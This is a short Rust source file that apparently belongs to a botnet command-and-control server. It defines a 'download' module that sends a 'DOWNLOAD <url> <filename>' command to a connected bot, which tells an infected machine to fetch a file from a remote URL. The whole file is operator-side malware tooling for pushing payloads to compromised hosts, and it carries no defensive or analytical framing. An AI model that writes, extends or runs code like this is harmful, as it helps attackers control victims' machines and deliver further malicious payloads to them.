// src/modules/download.rs
use std::sync::Arc;
use anyhow::Result;
use async_trait::async_trait;

use crate::communicating::types::BotConnection;
use crate::modules::types::C2Module;

pub struct DownloadModule;

impl DownloadModule {
    pub fn new() -> Self {
        DownloadModule
    }
}

#[async_trait]
impl C2Module for DownloadModule {
    fn name(&self) -> &'static str { "download" }
    fn description(&self) -> &'static str { "Download a file from URL" }

    async fn execute(&self, bot: Arc<BotConnection>, args: Vec<String>) -> Result<()> {
        if args.len() < 2 {
            return Err(anyhow::anyhow!("Usage: download <url> <filename>"));
        }
        let url = &args[0];
        let filename = &args[1];
        // NOTE the trailing `\n`—the protocol requires newline-terminated messages
        let cmd = format!("DOWNLOAD {} {}\n", url, filename);
        bot.send_message(&cmd).await?;
        Ok(())
    }

}
